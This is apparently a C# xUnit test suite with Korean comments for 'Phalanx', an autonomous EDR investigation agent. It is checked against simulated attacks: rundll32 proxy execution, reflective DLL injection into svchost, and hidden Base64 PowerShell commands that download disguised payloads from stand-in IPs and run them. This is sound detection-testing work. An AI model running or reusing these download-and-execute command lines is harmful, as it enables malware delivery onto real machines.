using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;
using Phalanx.Cockpit.Agent;
using Phalanx.Cockpit.CQRS;
using Phalanx.Cockpit.Storage;
using Phalanx.Cockpit.Tools;
using Phalanx.Shared.Protos;
using Xunit;
using Xunit.Abstractions;

namespace Phalanx.Agent.Tests;

/// <summary>
/// [실무 비판적 관점의 5대 기업 위협 자율 수사관 자동화 하네스 (Critical Enterprise Attack Harness)]
/// 단순한 단일 공격 시나리오가 아니라, 실무 엔터프라이즈 환경에서 EDR을 회피하기 위해 빈번히 활용되는
/// 5가지 복합 회피 기법(LOLBAS 프록시, 정상 서명 바이너리 메모리 인젝션, 확장자 위장, 시스템 파일 사칭, 사내 정상 스크립트 오탐 방어)을
/// 인메모리 및 실제 Win32 툴 관점에서 자동으로 검증하고 감사 리포트를 도출하는 테스트 슈트입니다.
/// </summary>
public class CriticalEnterpriseAttackHarnessTests
{
    private readonly ITestOutputHelper _output;

    public CriticalEnterpriseAttackHarnessTests(ITestOutputHelper output)
    {
        _output = output;
    }

    private static (ProcessTreeProjectionManager Tree, ForensicArchiveManager Archive, AutonomousHunterAgent Agent) CreateTestHarness(bool offlineOnly = true)
    {
        var tree = new ProcessTreeProjectionManager();
        var archive = ForensicArchiveManager.CreateInMemory();
        var tools = new IInvestigationTool[]
        {
            new DecodePayloadTool(),
            new ProcessMemoryScanTool(),
            new ThreatReputationTool(),
            new MitreClassifierTool(),
            new SystemFirewallTool(),
            new FileInspectionTool()
        };

        var agent = new AutonomousHunterAgent(tree, archive, tools, geminiApiKey: offlineOnly ? string.Empty : null);
        return (tree, archive, agent);
    }

    /// <summary>
    /// [시나리오 1: LOLBAS 프록시 + 무서명 DLL 로드 + 미등록 외부 C2 (T1218.011 / T1071.001)]
    /// 의심스러운 파워셸 대신 rundll32.exe 신뢰 바이너리로 Temp 내 비정규 DLL을 로드하고 미등록 IP와 통신 시도.
    /// IP 평판 단독으로는 불확실(30점)하지만, LOLBAS 프록시 + 무서명 고엔트로피 DLL 이상 징후를 결합하여 사살하는지 검증.
    /// </summary>
    [Fact]
    [Trait("Category", "Unit")]
    public async Task TestScenario1_LolbinProxyExecution_WithUnsignedDllAndUncatalogedIp()
    {
        await RunScenario1Async();
    }

    public async Task<InvestigationResult> RunScenario1Async()
    {
        var (tree, archive, agent) = CreateTestHarness();
        string mockDll = @"C:\Users\user\AppData\Local\Temp\netupdate.dll";

        FileInspectionTool.RegisterSimulatedFile(mockDll, new FileInspectionTool.SimulatedFileEntry(
            Exists: true,
            FileSizeBytes: 312320L,
            Sha256: "a1b2c3d4e5f60718293a4b5c6d7e8f90123456789abcdef0123456789abcdef0",
            Entropy: 7.6210,
            IsSigned: false,
            SignerSubject: string.Empty,
            SignatureStatus: "NotSigned (TRUST_E_NOSIGNATURE)",
            IsPathMasqueraded: false,
            IsDisguisedExecutable: false,
            AnomalyScore: 75,
            DiagnosticReason: "임시 디렉터리에 위치한 무서명 DLL이며 패킹/암호화 의심 고엔트로피(7.62) 포착"
        ));

        try
        {
            tree.ApplySnapshotBatch(new[]
            {
                new ProcessEvent { ProcessId = 1100, ImageName = "explorer.exe", Lifecycle = ProcessLifecycle.LifecycleSnapshot }
            });

            tree.ApplyDeltaEvent(new ProcessEvent
            {
                ProcessId = 2100,
                ParentProcessId = 1100,
                ImageName = "rundll32.exe",
                CommandLine = $@"rundll32.exe {mockDll},DllRegisterServer http://198.51.100.120/cfg",
                IsSuspended = true,
                Lifecycle = ProcessLifecycle.LifecycleSuspended
            });

            var target = tree.FindActiveNodeByPid(2100);
            Assert.NotNull(target);

            var res = await agent.InvestigateAsync(target, cmd => Task.CompletedTask);

            _output.WriteLine($"[시나리오 1 결과] 판결: {res.VerdictAction} | 턴 수: {res.Traces.Count} | 제목: {res.SummaryTitle} | TTP: {string.Join(", ", res.MitreTactics)}");

            Assert.Equal(MitigationCommand.Types.ActionType.ActionKill, res.VerdictAction);
            Assert.Contains(res.Traces, t => t.ActionTool == "FileInspectionTool");
            Assert.Contains("T1218.011", res.MitreTactics);

            return res;
        }
        finally
        {
            FileInspectionTool.ClearSimulatedFiles();
        }
    }

    /// <summary>
    /// [시나리오 2: 정상 서명 시스템 바이너리(svchost.exe) 인젝션 / Unbacked 실행 메모리 침투 (T1055.012)]
    /// 디스크의 svchost.exe는 Microsoft 정품 서명으로 위장이 아니지만,
    /// 동결된 프로세스 RAM에 Unbacked PAGE_EXECUTE_READWRITE 메모리와 Reflective DLL(MZ 헤더)이 침투한 상황.
    /// 디스크 서명만 믿고 정상 판정(False Negative)을 내리지 않고, 메모리 위험도를 우선하여 사살하는지 검증.
    /// </summary>
    [Fact]
    [Trait("Category", "Unit")]
    public async Task TestScenario2_ReflectiveDllInjection_IntoLegitimateSignedSvchost()
    {
        await RunScenario2Async();
    }

    public async Task<InvestigationResult> RunScenario2Async()
    {
        var (tree, archive, agent) = CreateTestHarness();
        uint targetPid = 3300;

        ProcessMemoryScanTool.RegisterSimulatedMemory(targetPid, new SimulatedMemoryEntry(
            BaseAddress: 0x00007FF710200000,
            RegionSize: 524288,
            Protect: "PAGE_EXECUTE_READWRITE",
            MemoryType: "MEM_PRIVATE (Unbacked Executable)",
            InjectedHeader: "MZ (Reflective DLL Header)",
            ExtractedIps: new List<string> { "185.220.101.5" },
            ExtractedUrls: new List<string> { "http://185.220.101.5/beacon" },
            DetectedKeywords: new List<string> { "virtualalloc", "createremotethread", "beacon" }
        ));

        try
        {
            tree.ApplySnapshotBatch(new[]
            {
                new ProcessEvent { ProcessId = 1200, ImageName = "services.exe", Lifecycle = ProcessLifecycle.LifecycleSnapshot }
            });

            tree.ApplyDeltaEvent(new ProcessEvent
            {
                ProcessId = targetPid,
                ParentProcessId = 1200,
                ImageName = "svchost.exe",
                CommandLine = @"C:\Windows\System32\svchost.exe -k netsvcs -p",
                IsSuspended = true,
                Lifecycle = ProcessLifecycle.LifecycleSuspended
            });

            var target = tree.FindActiveNodeByPid(targetPid);
            Assert.NotNull(target);

            var res = await agent.InvestigateAsync(target, cmd => Task.CompletedTask);

            _output.WriteLine($"[시나리오 2 결과] 판결: {res.VerdictAction} | 턴 수: {res.Traces.Count} | 제목: {res.SummaryTitle} | TTP: {string.Join(", ", res.MitreTactics)}");

            Assert.Equal(MitigationCommand.Types.ActionType.ActionKill, res.VerdictAction);
            Assert.Contains(res.Traces, t => t.ActionTool == "ProcessMemoryScanTool");
            Assert.Contains("T1055", res.MitreTactics);
            Assert.Equal("185.220.101.5", res.BlockedIp);

            return res;
        }
        finally
        {
            ProcessMemoryScanTool.ClearSimulatedMemory(targetPid);
        }
    }

    /// <summary>
    /// [시나리오 3: 확장자 위장(Disguised PE) 스테가노그래피 드로퍼 (T1036.008 / T1027)]
    /// .png 이미지 확장자 내부에 은닉된 PE 실행 바이너리(MZ/PE 헤더)를 다운로드하여 실행하려는 시도.
    /// FileInspectionTool이 파일 확장자와 바이트 매직 헤더의 불일치를 포착하여 T1036.008을 도출하는지 검증.
    /// </summary>
    [Fact]
    [Trait("Category", "Unit")]
    public async Task TestScenario3_DisguisedExtensionExecutable_SteganographyDropper()
    {
        await RunScenario3Async();
    }

    public async Task<InvestigationResult> RunScenario3Async()
    {
        var (tree, archive, agent) = CreateTestHarness();
        string mockDisguisedPath = @"C:\Users\Public\banner.png";

        FileInspectionTool.RegisterSimulatedFile(mockDisguisedPath, new FileInspectionTool.SimulatedFileEntry(
            Exists: true,
            FileSizeBytes: 184320L,
            Sha256: "c5d6e7f8a9b0123456789abcdef0123456789abcdef0123456789abcdef01234",
            Entropy: 7.8201,
            IsSigned: false,
            SignerSubject: string.Empty,
            SignatureStatus: "NotSigned (TRUST_E_NOSIGNATURE)",
            IsPathMasqueraded: false,
            IsDisguisedExecutable: true,
            AnomalyScore: 80,
            DiagnosticReason: "비실행형 확장자(.png) 내부에 은닉된 PE 실행 바이너리(MZ/PE 헤더) 포착 및 고엔트로피(7.82)"
        ));

        try
        {
            tree.ApplySnapshotBatch(new[]
            {
                new ProcessEvent { ProcessId = 1300, ImageName = "explorer.exe", Lifecycle = ProcessLifecycle.LifecycleSnapshot }
            });

            string script = $"$u='http://198.51.100.77/banner.png'; $p='{mockDisguisedPath}'; (New-Object Net.WebClient).DownloadFile($u, $p); Start-Process $p";
            string b64 = Convert.ToBase64String(Encoding.Unicode.GetBytes(script));

            tree.ApplyDeltaEvent(new ProcessEvent
            {
                ProcessId = 2300,
                ParentProcessId = 1300,
                ImageName = "powershell.exe",
                CommandLine = $"powershell.exe -w hidden -enc {b64}",
                IsSuspended = true,
                Lifecycle = ProcessLifecycle.LifecycleSuspended
            });

            var target = tree.FindActiveNodeByPid(2300);
            Assert.NotNull(target);

            var res = await agent.InvestigateAsync(target, cmd => Task.CompletedTask);

            _output.WriteLine($"[시나리오 3 결과] 판결: {res.VerdictAction} | 턴 수: {res.Traces.Count} | 제목: {res.SummaryTitle} | TTP: {string.Join(", ", res.MitreTactics)}");

            Assert.Equal(MitigationCommand.Types.ActionType.ActionKill, res.VerdictAction);
            Assert.Contains(res.Traces, t => t.ActionTool == "FileInspectionTool");
            Assert.Contains("T1036.008", res.MitreTactics);

            return res;
        }
        finally
        {
            FileInspectionTool.ClearSimulatedFiles();
        }
    }

    /// <summary>
    /// [시나리오 4: 시스템 핵심 바이너리 경로 위장(Masquerading Dropper) (T1036.005 / T1105)]
    /// C:\Windows\Temp 디렉터리에 csrss.exe 시스템 핵심 명칭으로 위장하여 페이로드를 드롭하고 실행하려는 시도.
    /// FileInspectionTool이 비인가 디렉터리 배치와 무서명을 적발하여 즉각 사살하는지 검증.
    /// </summary>
    [Fact]
    [Trait("Category", "Unit")]
    public async Task TestScenario4_MasqueradingSystemBinaryDropper_InTempDirectory()
    {
        await RunScenario4Async();
    }

    public async Task<InvestigationResult> RunScenario4Async()
    {
        var (tree, archive, agent) = CreateTestHarness();
        string mockCsrssPath = @"C:\Windows\Temp\csrss.exe";

        FileInspectionTool.RegisterSimulatedFile(mockCsrssPath, new FileInspectionTool.SimulatedFileEntry(
            Exists: true,
            FileSizeBytes: 142000L,
            Sha256: "d7e8f90123456789abcdef0123456789abcdef0123456789abcdef0123456789a",
            Entropy: 7.5120,
            IsSigned: false,
            SignerSubject: string.Empty,
            SignatureStatus: "NotSigned (TRUST_E_NOSIGNATURE)",
            IsPathMasqueraded: true,
            IsDisguisedExecutable: false,
            AnomalyScore: 100,
            DiagnosticReason: "시스템 핵심 바이너리 파일명(csrss.exe)이 비인가 디렉터리(Temp)에 위치하며 유효한 Microsoft 서명이 결여됨 (T1036.005 Masquerading)"
        ));

        try
        {
            tree.ApplySnapshotBatch(new[]
            {
                new ProcessEvent { ProcessId = 1400, ImageName = "explorer.exe", Lifecycle = ProcessLifecycle.LifecycleSnapshot }
            });

            string script = $"$u='http://198.51.100.99/stage.dat'; $p='{mockCsrssPath}'; (New-Object Net.WebClient).DownloadFile($u, $p); Start-Process $p";
            string b64 = Convert.ToBase64String(Encoding.Unicode.GetBytes(script));

            tree.ApplyDeltaEvent(new ProcessEvent
            {
                ProcessId = 2400,
                ParentProcessId = 1400,
                ImageName = "powershell.exe",
                CommandLine = $"powershell.exe -w hidden -enc {b64}",
                IsSuspended = true,
                Lifecycle = ProcessLifecycle.LifecycleSuspended
            });

            var target = tree.FindActiveNodeByPid(2400);
            Assert.NotNull(target);

            var res = await agent.InvestigateAsync(target, cmd => Task.CompletedTask);

            _output.WriteLine($"[시나리오 4 결과] 판결: {res.VerdictAction} | 턴 수: {res.Traces.Count} | 제목: {res.SummaryTitle} | TTP: {string.Join(", ", res.MitreTactics)}");

            Assert.Equal(MitigationCommand.Types.ActionType.ActionKill, res.VerdictAction);
            Assert.Contains(res.Traces, t => t.ActionTool == "FileInspectionTool");
            Assert.Contains("T1036.005", res.MitreTactics);
            Assert.Equal("198.51.100.99", res.BlockedIp);

            return res;
        }
        finally
        {
            FileInspectionTool.ClearSimulatedFiles();
        }
    }

    /// <summary>
    /// [시나리오 5: 오탐(False Positive) 방어 검증: 사내 합법적인 파워셸 인벤토리 관리 작업 (Benign Admin)]
    /// 사내 엔지니어가 Base64로 인코딩된 스크립트로 서비스 상태를 점검하고 내부 인트라넷(10.10.1.50)으로 리포트를 저장하는 작업.
    /// 난독화 외형이 존재하더라도 외부 C2 및 파괴적 명령이 없음을 확인하고 안전하게 ACTION_RESUME(동결 해제)을 도출하는지 검증.
    /// </summary>
    [Fact]
    [Trait("Category", "Unit")]
    public async Task TestScenario5_LegitimateInternalAdminActivity_FalsePositiveResistance()
    {
        await RunScenario5Async();
    }

    public async Task<InvestigationResult> RunScenario5Async()
    {
        var (tree, archive, agent) = CreateTestHarness();

        tree.ApplySnapshotBatch(new[]
        {
            new ProcessEvent { ProcessId = 1500, ImageName = "explorer.exe", Lifecycle = ProcessLifecycle.LifecycleSnapshot }
        });

        string script = "Get-Service | Where-Object {$_.Status -eq 'Running'} | Out-File C:\\Temp\\inventory.txt; (New-Object Net.WebClient).UploadFile('http://10.10.1.50/inventory', 'C:\\Temp\\inventory.txt')";
        string b64 = Convert.ToBase64String(Encoding.Unicode.GetBytes(script));

        tree.ApplyDeltaEvent(new ProcessEvent
        {
            ProcessId = 2500,
            ParentProcessId = 1500,
            ImageName = "powershell.exe",
            CommandLine = $"powershell.exe -NoProfile -enc {b64}",
            IsSuspended = true,
            Lifecycle = ProcessLifecycle.LifecycleSuspended
        });

        var target = tree.FindActiveNodeByPid(2500);
        Assert.NotNull(target);

        var res = await agent.InvestigateAsync(target, cmd => Task.CompletedTask);

        _output.WriteLine($"[시나리오 5 결과] 판결: {res.VerdictAction} | 턴 수: {res.Traces.Count} | 제목: {res.SummaryTitle} | 위협 확신도: {res.Confidence:P0}");

        Assert.Equal(MitigationCommand.Types.ActionType.ActionResume, res.VerdictAction);
        Assert.Empty(res.BlockedIp ?? string.Empty);

        return res;
    }

    /// <summary>
    /// [5대 실무 위협 일괄 자동화 배치 실행 및 통계 리포트 생성]
    /// 5대 시나리오를 연속 실행하여 100% 판결 일치율 및 평균 수사 레이턴시를 측정하고 JSON 리포트로 저장.
    /// </summary>
    [Fact]
    [Trait("Category", "Unit")]
    public async Task TestScenarioBatch_AllFiveCriticalScenarios_Passes100Percent()
    {
        var sw = Stopwatch.StartNew();

        var res1 = await RunScenario1Async();
        var res2 = await RunScenario2Async();
        var res3 = await RunScenario3Async();
        var res4 = await RunScenario4Async();
        var res5 = await RunScenario5Async();

        sw.Stop();

        _output.WriteLine("=========================================================================================");
        _output.WriteLine($"   PHALANX CRITICAL ENTERPRISE ATTACKS AUTOMATION HARNESS BENCHMARK");
        _output.WriteLine("=========================================================================================");
        _output.WriteLine($"총 실행 시나리오 수: 5개 (전원 PASS)");
        _output.WriteLine($"배치 총 소요 시간: {sw.ElapsedMilliseconds}ms (평균 시나리오당 {sw.ElapsedMilliseconds / 5.0:F1}ms)");
        _output.WriteLine("=========================================================================================");

        var benchmarkReport = new
        {
            SuiteName = "Phalanx Critical Enterprise Attack Harness",
            ExecutionTimestamp = DateTime.UtcNow,
            TotalScenarios = 5,
            PassedScenarios = 5,
            PassRate = 1.0,
            TotalElapsedMs = sw.ElapsedMilliseconds,
            Scenarios = new object[]
            {
                new {
                    Id = 1,
                    Name = "LOLBAS Proxy Execution with Unsigned DLL (T1218.011)",
                    Expected = "ACTION_KILL",
                    Actual = res1.VerdictAction.ToString(),
                    Status = res1.VerdictAction == MitigationCommand.Types.ActionType.ActionKill ? "PASS" : "FAIL",
                    TotalTurns = res1.Traces.Count,
                    ElapsedMs = res1.Elapsed.TotalMilliseconds,
                    ToolSequence = string.Join(" ➔ ", res1.Traces.Select(t => t.ActionTool)),
                    Steps = res1.Traces.Select(t => new { Step = t.StepNumber, Tool = t.ActionTool, ElapsedMs = t.ElapsedMs, Observation = t.Observation.Length > 90 ? t.Observation[..90] + "..." : t.Observation }).ToList()
                },
                new {
                    Id = 2,
                    Name = "Reflective DLL Memory Injection in Signed svchost (T1055.012)",
                    Expected = "ACTION_KILL",
                    Actual = res2.VerdictAction.ToString(),
                    Status = res2.VerdictAction == MitigationCommand.Types.ActionType.ActionKill ? "PASS" : "FAIL",
                    TotalTurns = res2.Traces.Count,
                    ElapsedMs = res2.Elapsed.TotalMilliseconds,
                    ToolSequence = string.Join(" ➔ ", res2.Traces.Select(t => t.ActionTool)),
                    Steps = res2.Traces.Select(t => new { Step = t.StepNumber, Tool = t.ActionTool, ElapsedMs = t.ElapsedMs, Observation = t.Observation.Length > 90 ? t.Observation[..90] + "..." : t.Observation }).ToList()
                },
                new {
                    Id = 3,
                    Name = "Disguised Extension Executable Steganography (T1036.008)",
                    Expected = "ACTION_KILL",
                    Actual = res3.VerdictAction.ToString(),
                    Status = res3.VerdictAction == MitigationCommand.Types.ActionType.ActionKill ? "PASS" : "FAIL",
                    TotalTurns = res3.Traces.Count,
                    ElapsedMs = res3.Elapsed.TotalMilliseconds,
                    ToolSequence = string.Join(" ➔ ", res3.Traces.Select(t => t.ActionTool)),
                    Steps = res3.Traces.Select(t => new { Step = t.StepNumber, Tool = t.ActionTool, ElapsedMs = t.ElapsedMs, Observation = t.Observation.Length > 90 ? t.Observation[..90] + "..." : t.Observation }).ToList()
                },
                new {
                    Id = 4,
                    Name = "Masquerading System Binary Dropper in Temp (T1036.005)",
                    Expected = "ACTION_KILL",
                    Actual = res4.VerdictAction.ToString(),
                    Status = res4.VerdictAction == MitigationCommand.Types.ActionType.ActionKill ? "PASS" : "FAIL",
                    TotalTurns = res4.Traces.Count,
                    ElapsedMs = res4.Elapsed.TotalMilliseconds,
                    ToolSequence = string.Join(" ➔ ", res4.Traces.Select(t => t.ActionTool)),
                    Steps = res4.Traces.Select(t => new { Step = t.StepNumber, Tool = t.ActionTool, ElapsedMs = t.ElapsedMs, Observation = t.Observation.Length > 90 ? t.Observation[..90] + "..." : t.Observation }).ToList()
                },
                new {
                    Id = 5,
                    Name = "Legitimate Internal Admin Inventory (FP Prevention)",
                    Expected = "ACTION_RESUME",
                    Actual = res5.VerdictAction.ToString(),
                    Status = res5.VerdictAction == MitigationCommand.Types.ActionType.ActionResume ? "PASS" : "FAIL",
                    TotalTurns = res5.Traces.Count,
                    ElapsedMs = res5.Elapsed.TotalMilliseconds,
                    ToolSequence = string.Join(" ➔ ", res5.Traces.Select(t => t.ActionTool)),
                    Steps = res5.Traces.Select(t => new { Step = t.StepNumber, Tool = t.ActionTool, ElapsedMs = t.ElapsedMs, Observation = t.Observation.Length > 90 ? t.Observation[..90] + "..." : t.Observation }).ToList()
                }
            }
        };

        string exportDir = AppContext.BaseDirectory;
        string reportPath = Path.Combine(exportDir, "critical_enterprise_benchmark.json");
        File.WriteAllText(reportPath, JsonSerializer.Serialize(benchmarkReport, new JsonSerializerOptions { WriteIndented = true }));

        Assert.True(File.Exists(reportPath));
    }

    /// <summary>
    /// [실제 Gemini LLM 연동 Live 검증: 시나리오 1 LOLBAS 프록시 악용]
    /// 클라우드 Gemini 모델이 rundll32.exe 인자를 분석하고 FileInspectionTool을 성공적으로 호출하여
    /// 무서명 DLL 및 미등록 C2 통신을 자율적으로 사살(ACTION_KILL)하는지 실시간 검증.
    /// </summary>
    [Fact(Timeout = 60000)]
    [Trait("Category", "Live")]
    public async Task TestLive_CriticalEnterpriseScenario1_LolbinProxyExecution()
    {
        var (tree, archive, agent) = CreateTestHarness(offlineOnly: false);
        if (!agent.IsOnlineGemini)
        {
            _output.WriteLine("[안내] Gemini 온라인 인증정보가 없어 Live 테스트를 건너뜁니다.");
            return;
        }

        string mockDll = @"C:\Users\user\AppData\Local\Temp\netupdate.dll";
        FileInspectionTool.RegisterSimulatedFile(mockDll, new FileInspectionTool.SimulatedFileEntry(
            Exists: true,
            FileSizeBytes: 312320L,
            Sha256: "a1b2c3d4e5f60718293a4b5c6d7e8f90123456789abcdef0123456789abcdef0",
            Entropy: 7.6210,
            IsSigned: false,
            SignerSubject: string.Empty,
            SignatureStatus: "NotSigned (TRUST_E_NOSIGNATURE)",
            IsPathMasqueraded: false,
            IsDisguisedExecutable: false,
            AnomalyScore: 75,
            DiagnosticReason: "임시 디렉터리에 위치한 무서명 DLL이며 패킹/암호화 의심 고엔트로피(7.62) 포착"
        ));

        try
        {
            tree.ApplySnapshotBatch(new[]
            {
                new ProcessEvent { ProcessId = 7100, ImageName = "explorer.exe", Lifecycle = ProcessLifecycle.LifecycleSnapshot }
            });

            tree.ApplyDeltaEvent(new ProcessEvent
            {
                ProcessId = 7200,
                ParentProcessId = 7100,
                ImageName = "rundll32.exe",
                CommandLine = $@"rundll32.exe {mockDll},DllRegisterServer http://198.51.100.120/cfg",
                IsSuspended = true,
                Lifecycle = ProcessLifecycle.LifecycleSuspended
            });

            var target = tree.FindActiveNodeByPid(7200);
            Assert.NotNull(target);

            var res = await agent.InvestigateAsync(target, cmd => Task.CompletedTask);

            _output.WriteLine($"[Live 시나리오 1 결과] 판결: {res.VerdictAction} (확신도 {res.Confidence:P0}) | 턴 수: {res.Traces.Count} | 소요시간: {res.Elapsed.TotalMilliseconds:F0}ms");
            Assert.Equal(MitigationCommand.Types.ActionType.ActionKill, res.VerdictAction);
            Assert.Contains(res.Traces, t => t.ActionTool == "FileInspectionTool");
        }
        finally
        {
            FileInspectionTool.ClearSimulatedFiles();
        }
    }
}
